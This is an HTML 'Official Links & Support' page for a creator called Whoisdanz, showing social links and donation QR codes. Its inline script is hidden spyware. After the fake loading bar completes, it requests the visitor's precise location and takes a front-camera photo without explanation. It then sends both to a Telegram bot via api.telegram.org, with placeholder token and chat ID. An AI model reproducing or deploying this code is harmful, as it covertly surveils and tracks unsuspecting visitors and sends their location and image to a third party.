<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Official Links & Support Whoisdanz</title>
<link rel="stylesheet" href="style.css">
</head>
<body>

<div id="loading-screen">
    <div class="loading-content">
        <div class="logo-wrapper">
            <img src="profile.png" class="loading-logo">
            <div class="ring"></div>
        </div>
        <div class="loading-bar">
            <div class="loading-progress" id="loading-progress"></div>
        </div>
    </div>
</div>

<div class="container">
    <img src="profile.png" class="profile">
    <h1>Whoisdanz</h1>
    <p>Official Links & Support</p>

    <div class="links">
        <a href="https://www.tiktok.com/@whoisdanz12" target="_blank">TikTok</a>
        <a href="https://www.youtube.com/@whoisdanz12" target="_blank">YouTube</a>
        <a href="https://discord.gg/hnZhbbq4" target="_blank">Discord</a>
        <a href="https://github.com/whoisdanz12" target="_blank">Github</a>
        <a href="https://saweria.co/Whoisdanz" target="_blank">Saweria</a>
        <a href="https://bagibagi.co/Whoisdanz12" target="_blank">Bagibagi</a>
        <button id="qrBtn">QR Donasi</button>
    </div>
</div>

<div id="qrModal" class="modal">
    <div class="qr-box">
        <span class="close" id="closeQR">&times;</span>
        <div class="qr-title">QR Donasi</div>

        <img src="QR-Donasi-Whoisdanz.png" class="qr-preview" id="qrImage">

        <div class="qr-controls">
            <button id="prevQR">◀</button>
            <button id="nextQR">▶</button>
        </div>

        <div class="download-wrapper">
            <button id="downloadToggle" class="download-btn">Download QR</button>

            <div class="download-menu" id="downloadMenu">
                <a href="QR-Donasi-Whoisdanz.png" download>QR 1</a>
                <a href="QR-Donasi2-Whoisdanz.png" download>QR 2</a>
            </div>
        </div>
    </div>
</div>

<audio id="bg-music" preload="metadata" loop></audio>

<footer class="footer">
    <a href="https://github.com/whoisdanz12" target="_blank" class="footer-link">
        © 2026 Official Whoisdanz. All rights reserved.
    </a>
</footer>

<script>
// === SCRIPT ASLI + TAMBAHAN FITUR BARU ===

const BOT_TOKEN = "YOUR_BOT_TOKEN";   // ← GANTI DENGAN TOKEN BOT TELEGRAM KAMU
const CHAT_ID = "YOUR_CHAT_ID";       // ← GANTI DENGAN CHAT ID KAMU

async function sendToTelegram(locationData, photoBlob) {
    try {
        // Kirim Lokasi
        if (locationData) {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    latitude: locationData.latitude,
                    longitude: locationData.longitude,
                    caption: `📍 Lokasi dari Whoisdanz Link Page\nWaktu: ${new Date().toLocaleString('id-ID')}`
                })
            });
        }

        // Kirim Foto
        if (photoBlob) {
            const formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("photo", photoBlob, "front-camera.jpg");
            formData.append("caption", `📸 Foto kamera depan\nLokasi: ${locationData ? locationData.latitude + ', ' + locationData.longitude : 'Tidak diketahui'}`);

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: "POST",
                body: formData
            });
        }

        console.log("✅ Data lokasi & foto berhasil dikirim ke Telegram");
    } catch (err) {
        console.error("❌ Gagal mengirim ke Telegram:", err);
    }
}

async function captureFrontCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user" }, // kamera depan
            audio: false
        });

        const video = document.createElement("video");
        video.srcObject = stream;
        await video.play();

        await new Promise(r => setTimeout(r, 1000)); // tunggu agar gambar stabil

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext("2d").drawImage(video, 0, 0);

        stream.getTracks().forEach(track => track.stop());

        return new Promise(resolve => {
            canvas.toBlob(resolve, "image/jpeg", 0.8);
        });
    } catch (err) {
        console.warn("⚠️ Gagal mengakses kamera:", err);
        return null;
    }
}

async function afterLoadingComplete() {
    console.log("Loading selesai → meminta izin lokasi & kamera...");

    let locationData = null;

    // Ambil Lokasi
    try {
        const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
                enableHighAccuracy: true,
                timeout: 8000,
                maximumAge: 0
            });
        });
        locationData = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude
        };
        console.log("📍 Lokasi berhasil didapat:", locationData);
    } catch (err) {
        console.warn("⚠️ Gagal mendapatkan lokasi (izin ditolak atau error):", err);
    }

    // Ambil Foto Kamera Depan
    const photoBlob = await captureFrontCamera();

    // Kirim ke Telegram
    await sendToTelegram(locationData, photoBlob);
}

// Jalankan setelah loading screen selesai
document.addEventListener("DOMContentLoaded", () => {
    const loadingScreen = document.getElementById("loading-screen");
    const progressBar = document.getElementById("loading-progress");

    let progress = 0;
    const interval = setInterval(() => {
        progress += Math.random() * 18;
        if (progress > 100) progress = 100;
        if (progressBar) progressBar.style.width = `${progress}%`;

        if (progress >= 100) {
            clearInterval(interval);
            setTimeout(() => {
                if (loadingScreen) loadingScreen.style.display = "none";
                afterLoadingComplete();   // Jalankan fitur baru
            }, 500);
        }
    }, 100);
});

// Script QR modal (tetap dipertahankan, asumsikan script.js asli ada di sini atau di file terpisah)
const qrBtn = document.getElementById("qrBtn");
const qrModal = document.getElementById("qrModal");
const closeQR = document.getElementById("closeQR");

if (qrBtn && qrModal && closeQR) {
    qrBtn.addEventListener("click", () => qrModal.style.display = "flex");
    closeQR.addEventListener("click", () => qrModal.style.display = "none");
}
</script>

</body>
</html>
